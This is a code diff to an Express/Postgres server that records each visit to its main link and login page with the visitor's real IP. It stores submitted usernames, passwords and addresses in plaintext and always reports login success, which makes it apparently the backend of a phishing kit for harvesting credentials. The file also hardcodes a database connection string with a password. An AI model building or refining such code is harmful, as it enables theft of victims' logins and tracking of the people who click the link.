@@ -5,7 +5,6 @@ const { Pool } = require('pg');
 const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
-
 // Supabase Connection
 const pool = new Pool({
     connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
@@ -22,6 +21,13 @@ pool.query(`CREATE TABLE IF NOT EXISTS records (
     timestamp TEXT
 )`);
 
+function getRealIP(req) {
+    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+           req.headers['x-real-ip'] ||
+           req.ip ||
+           'Unknown';
+}
+
 function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
     pool.query(
@@ -31,23 +37,23 @@ function saveRecord(type, username = null, password = null, address = null, ip =
     console.log(`✅ SAVED: ${type} | IP: ${ip}`);
 }
 
-// MAIN LINK CLICK - This must work
+// Record Page Visit Immediately
 app.get('/', (req, res) => {
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    const ip = getRealIP(req);
     saveRecord('Page Visit', null, null, null, ip);
-    console.log("🔴 MAIN LINK WAS CLICKED!");
+    console.log("🔴 MAIN LINK CLICKED! Real IP:", ip);
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/login.html', (req, res) => {
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    const ip = getRealIP(req);
     saveRecord('Page Visit', null, null, null, ip);
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
 app.post('/api/login', (req, res) => {
     const { username, password, address } = req.body;
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    const ip = getRealIP(req);
     saveRecord('Login Attempt', username, password, address, ip);
     res.json({ success: true });
 });
